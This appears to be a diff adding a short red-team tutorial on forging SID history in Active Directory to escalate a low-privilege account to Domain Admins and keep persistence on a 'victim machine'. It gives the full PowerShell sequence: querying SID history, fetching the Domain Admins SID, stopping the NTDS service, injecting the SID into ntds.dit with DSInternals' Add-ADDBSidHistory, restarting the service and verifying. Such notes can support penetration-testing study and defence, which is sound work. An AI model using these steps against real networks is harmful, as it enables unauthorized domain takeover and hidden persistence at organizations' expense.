@@ -1,0 +1,35 @@
+We can forge some history in order to leverage privileges and gain us
+some persistence within the network.
+
+First, launch powershell within the victim machine.
+You want to get an SSH session with some local admin credentials for this one.
+
+Once you've got all the req's, do the following:
+
+Get-ADUser <youraduser> -properties sidhistory,memberof
+
+Make sure that your low privilege user does not have any sort of information
+inside of their SID history. (Command above)
+
+Then, get the SID of the Domain Admins group since this is the group
+we want to add to our SID history:
+
+Get-ADGroup "Domain Admins"
+We could use mimikatz for this, but there is a flaw in the system which 
+doesn't patch LSASS to update our history, so we need another tool.
+
+We will be using a tool named DS Internals for this. 
+Firstly, stop the ntds service:
+Stop-Service -Name ntds -force
+
+Then, add the SID history:
+Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
+
+Then, start it:
+Start-Service -Name ntds 
+
+Now, we should start a new powershell session and then verify that we have
+admin credentials:
+Get-ADUser aaron.jones -Properties sidhistory 
+
+ 
